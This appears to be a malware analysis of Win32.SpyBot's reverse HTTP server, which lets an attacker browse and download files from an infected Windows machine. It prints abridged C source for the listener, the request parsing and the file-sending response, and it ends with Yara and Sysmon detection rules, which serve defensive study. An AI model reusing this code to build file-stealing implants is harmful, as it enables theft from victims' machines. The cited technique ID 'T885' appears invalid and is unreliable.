# SpyBot: Reverse HTTP Server for On-Demand File Exfiltration

**Repository:** `MalwareSourceCode-main`  
**File:** `Win32/Malware Families/Win32.SpyBot/Win32.SpyBot.a.c/spybot.c`  
**Language:** C  
**MITRE ATT&CK:** T1041 (Exfiltration Over C2 Channel), T1071.001 (Web Protocols), T885 (Inbound Connection)

### Executive Summary

The Win32.SpyBot malware implements a sophisticated reverse HTTP server, turning an infected machine into a data repository that the attacker can connect to and browse on demand. Unlike traditional exfiltration where the implant "pushes" data out to a C2 server, SpyBot's model has the implant "listen" for incoming connections. An attacker, typically after coordinating via an IRC control channel, can connect to the victim machine with a standard web browser or script and issue HTTP GET requests to list directories and download files. This inversion of the client-server model was an innovative technique for its time, designed to bypass firewalls that primarily monitored and blocked suspicious *outbound* connections.

### Code Snippet & Analysis

The entire reverse HTTP server is a multi-threaded system implemented in `spybot.c`. The process begins when the `HTTP_server` function is triggered by an IRC command, which then spawns the main server thread.

#### 1. `HTTP_server` & `HTTP_server_thread`: The Main Server Loop

The `HTTP_server` function acts as the entry point. It calls `Listen()` to create and bind a socket to the specified port, then launches `HTTP_server_thread` to manage incoming connections. This thread runs an infinite loop using `select()` to handle multiple simultaneous connections without blocking. When a new connection is accepted, it receives the attacker's GET request and dispatches it to `Check_Requestedfile`.

```c
// File: spybot.c

// Entry point, triggered by an IRC command like "httpserver 80 C:\"
int HTTP_server(char *dir, int http_poort)
{
    DWORD id;
    HANDLE handle;
    SOCKET HTTPServer;

    // 1. Create a listening socket on the specified port
    if ((HTTPServer = Listen(http_poort)) == -1)
        return -1;

    // 2. Create the main server thread to handle connections
    handle = CreateThread(NULL, 0, &HTTP_server_thread, (LPVOID)c, 0, &id);
    // ... thread management ...
    return c;
}

// The main server thread that accepts and handles C2 connections
DWORD WINAPI HTTP_server_thread(LPVOID Param) 
{
    int threadnum = (int)Param;
    SOCKET guest;
    fd_set master, temp;
    FD_ZERO(&master);
    FD_SET(threads[threadnum].sock, &master); // Add listening socket to the set
    int max = threads[threadnum].sock;

    while (1) // Infinite loop to accept connections
    {
        temp = master;
        // 3. Wait for activity on any of the sockets (listening or connected)
        if (select(max + 1, &temp, NULL, NULL, NULL) == SOCKET_ERROR) break;

        for(int i = 0; i <= max; i++) {
            if (FD_ISSET(i, &temp)) { 
                if (i == threads[threadnum].sock) {
                    // 4. Accept a new incoming connection from the C2
                    if ((guest = accept(threads[threadnum].sock, ...)) != INVALID_SOCKET) {
                        FD_SET(guest, &master); // Add the new connection to the set
                        if (guest > max) max = guest;
                    }
                } else {
                    // 5. Receive data (the HTTP GET request) from an existing connection
                    if (recv(i, buffer, sizeof(buffer), 0) <= 0) {
                        closesocket(i); 
                        FD_CLR(i, &master);
                    } else {
                        // 6. Parse the GET request to find the requested file path
                        if (strstr(rBuffer, "GET ") != NULL) {
                            file_to_send = strtok(strstr(strstr(rBuffer, "GET "), " "), " ");
                            strcpy(file, file_to_send);
                        }
                        // 7. On end of headers ("\r\n"), dispatch to the file checker
                        else if (strcmp(rBuffer, "\r\n") == 0) {
                            Check_Requestedfile(i, threads[threadnum].dir, file);
                        }
                    }
                }
            }
        }
    }
    // ... cleanup ...
    return 0;
}
```

#### 2. `Check_Requestedfile` & `http_header`: Response Generation

Once a request is parsed, `Check_Requestedfile` determines if the target is a file or a directory. It then populates global variables and launches the `http_header` thread to construct and send the appropriate HTTP response.

```c
// File: spybot.c

// Checks if the requested path is a file or directory and spawns the response thread.
int Check_Requestedfile(SOCKET sock, char *dir, char *rFile)
{
    // ... logic to clean up the requested file path ...
    sprintf(tFile, "%s%s", dir, nFile); // Construct full path

    // 1. Check if the path is a directory
    if (GetFileAttributes(tFile) == FILE_ATTRIBUTE_DIRECTORY) 
        directory = TRUE;
    
    // ... error handling for invalid files ...

    DWORD id;
    if (directory) {
        // 2a. For a directory, set type and prepare for HTML listing
        http_Type = TRUE; // TRUE = directory listing
        http_lenght = 10000; // Dummy length
        sprintf(http_file, "%s*", tFile); // Add wildcard for enumeration
        sprintf(http_path, nFile);
    } else { 
        // 2b. For a file, get its actual size for the Content-Length header
        HANDLE testfile = CreateFile(tFile, GENERIC_READ, ...);
        http_lenght = GetFileSize(testfile, NULL);
        CloseHandle(testfile);
        http_Type = FALSE; // FALSE = file transfer
        sprintf(http_file, tFile);
    }

    // 3. Create a new thread to handle the response generation and sending
    if (CreateThread(NULL, 0, &http_header, (LPVOID)sock, 0, &id)) {
        while (http_info == FALSE) Sleep(5); // Wait for thread to initialize
    }
    return 0;
}

// This thread builds the HTTP header and calls the appropriate sending function.
DWORD WINAPI http_header(LPVOID param)
{
    SOCKET sock = (SOCKET)param;
    // ... copy global variables to local ...
    http_info = TRUE; // Signal that parameters are captured

    // 1. Set Content-Type based on whether it's a file or directory
    char content[50];
    if (type) sprintf(content, "text/html");
    else sprintf(content, "application/octet-stream");
    
    // ... get current date and time ...

    // 2. Construct the full HTTP/1.0 200 OK response header
    sprintf(buffer,
        "HTTP/1.0 200 OK\r\n"
        "Server: SpyBot1.2\r\n" // Unique server header
        "Date: %s %s GMT\r\n"
        "Content-Type: %s\r\n"
        "Accept-Ranges: bytes\r\n"
        "Last-Modified: %s %s GMT\r\n"
        "Content-Length: %i\r\n"
        "Connection: close\r\n"
        "\r\n",
        date, time, content, date, time, lenght);
    
    // 3. Send the header to the attacker
    send(sock, buffer, strlen(buffer), 0);

    // 4. Call the appropriate function to send the body
    if (type == FALSE) http_send_file(sock, tFile); // Send the binary file
    else getfiles(tFile, sock, NULL, nFile);      // Send the HTML directory listing
    
    closesocket(sock);
    return 0;
}
```

### What it does

1.  **Listen:** Upon receiving a command via its primary C2 (IRC), the bot starts a listener on a specified port (e.g., 80), acting as a web server.
2.  **Accept Connection:** It waits for an inbound TCP connection from the attacker. This is the "reverse" part of the connection, initiated by the C2, not the implant.
3.  **Parse Request:** Once connected, it receives and parses a standard HTTP GET request from the attacker (e.g., `GET /C:/windows/system32/calc.exe HTTP/1.0`).
4.  **Build Header:** It dynamically constructs a legitimate-looking `HTTP/1.0 200 OK` response header, complete with a custom `Server: SpyBot1.2` field, the correct `Content-Type` (for a file or directory), and the `Content-Length`.
5.  **Exfiltrate Data:** It sends the header, followed by the requested data. If the request was for a file, it streams the file's binary content. If it was for a directory, it enumerates the contents and sends back an HTML page with a list of files and subdirectories.
6.  **Close:** After the transfer is complete, it closes the connection.

### Why it's a TTP

This technique is a powerful example of **Exfiltration Over C2 Channel (T1041)** combined with **Inbound Connection (T885)**. By having the implant act as a server and accept inbound connections, it subverts the security posture of many early firewalls, which were configured to block suspicious *outbound* traffic while allowing inbound traffic on common ports like 80 (HTTP). The use of a compliant HTTP/1.0 protocol makes the traffic appear legitimate to network inspection tools, while the custom `Server: SpyBot1.2` header provides a unique fingerprint for detection.

### Detection & Evasion

#### Yara

This Yara rule is designed to detect the SpyBot implant in memory or on disk by searching for the unique strings used to construct the HTTP response header, which are highly specific to this malware.

```yara
rule TTP_Exfil_SpyBot_Reverse_HTTP_Server {
    meta:
        author = "Red Team"
        description = "Detects the embedded reverse HTTP server in Win32.SpyBot by fingerprinting its unique HTTP response headers."
        ttp = "T1041, T885"
    strings:
        // Unique server header string
        $server_header = "Server: SpyBot1.2" ascii

        // Other parts of the HTTP response construction
        $http_ok = "HTTP/1.0 200 OK" ascii
        $content_type = "Content-Type: %s" ascii
        $content_length = "Content-Length: %i" ascii
        $conn_close = "Connection: close" ascii
        
        // Function names
        $func_http_header = "http_header" wide
        $func_http_send_file = "http_send_file" wide

    condition:
        uint16(0) == 0x5A4D and // Is a PE file
        all of ($func*) and
        all of ($http_*) and
        $server_header
}
```

#### Sysmon

The behavior of a non-server process binding to a port and accepting inbound connections is highly anomalous and a strong indicator of compromise. This Sysmon rule specifically targets this behavior.

-   **Event ID 3 (Network Connect):** Look for an inbound connection (`"initiated": "false"`) to a process that is not a known, legitimate web server.

```xml
<Sysmon schemaversion="4.82">
    <RuleGroup name="TTP_Exfil_SpyBot_Reverse_HTTP_Server" groupRelation="and">
        <NetworkConnect onmatch="include">
            <!-- Look for INBOUND connections -->
            <Initiated>false</Initiated>
            
            <!-- Common web server ports -->
            <DestinationPort>80</DestinationPort>
            <DestinationPort>8080</DestinationPort>
            <DestinationPort>443</DestinationPort>
        </NetworkConnect>
        <NetworkConnect onmatch="exclude">
            <!-- Exclude legitimate server processes -->
            <Image condition="is">C:\Windows\System32\svchost.exe</Image> <!-- For IIS -->
            <Image condition="is">C:\Program Files\Apache Group\Apache2\bin\httpd.exe</Image>
            <Image condition="is">C:\nginx\nginx.exe</Image>
            <!-- Add other legitimate server processes in your environment -->
        </NetworkConnect>
    </RuleGroup>
</Sysmon>
```
**Note:** This rule is very effective but requires careful tuning to whitelist all legitimate server applications in a given environment to avoid false positives. Any process outside of this whitelist that accepts an inbound connection on a web port should be investigated.
